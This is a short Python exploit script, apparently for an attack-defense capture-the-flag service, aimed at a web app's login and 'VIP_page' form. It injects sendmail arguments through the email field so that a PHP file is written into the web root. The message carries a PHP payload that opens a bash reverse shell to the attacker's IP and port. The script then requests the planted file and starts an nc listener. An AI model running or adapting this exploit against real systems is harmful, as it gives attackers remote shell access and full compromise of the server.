#!/usr/bin/env python3

import os
import sys
import requests
from checklib import *

host,listen_ip,listen_port,login,passwd,sploit_name = sys.argv[1:]
port = 8000

location = f'sploit@mail -oQ/tmp/ -X/var/www/html/images/{sploit_name}.php'

payload = """{unwrap}<?php sleep(%d); system("/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1' ");  ?>{/unwrap}""" % (3, listen_ip, listen_port)

url = f'http://{host}:{port}'

sess = get_initialized_session()

sess.post(f'{url}/account/login', data={'login': login, 'passwd': passwd})

sess.post(f'{url}/casinoe/VIP_page', data = {"email": location, "message": payload})

os.system(f"curl -m 2 {url}/images/{sploit_name}.php")

os.system(f"nc -nlvp {listen_port}")
